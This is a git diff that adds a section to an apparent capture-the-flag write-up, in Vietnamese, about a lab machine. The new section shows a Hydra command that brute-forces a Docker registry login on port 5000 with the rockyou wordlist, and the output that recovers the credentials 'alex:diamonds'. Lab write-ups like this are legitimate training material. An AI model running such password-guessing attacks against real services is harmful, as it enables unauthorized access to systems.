@@ -59,3 +59,20 @@ msf6 auxiliary(scanner/smtp/smtp_enum) > exploit
 ```
 Sau scan xong bạn sẽ thấy `alex`.
 ## Exploit
+[5000-pentesting-docker-registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
+Bạn có thể đọc nó. khi test req lên port 5000 ta thấy docker yêu cầu xác thực, tiến hành bruteforce nó với name là `alex`.
+
+```shell
+➜  ~ hydra -l alex -P /usr/share/wordlists/rockyou.txt 10.10.11.9  -s 5000 https-get /v2/
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 23:47:10
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-gets://10.10.11.9:5000/v2/
+[5000][http-get] host: 10.10.11.9   login: alex   password: diamonds
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 23:47:36
+➜  ~
+```
+`alex:diamonds`<br>
+rồi xem docker tại port 5000 thôi :>
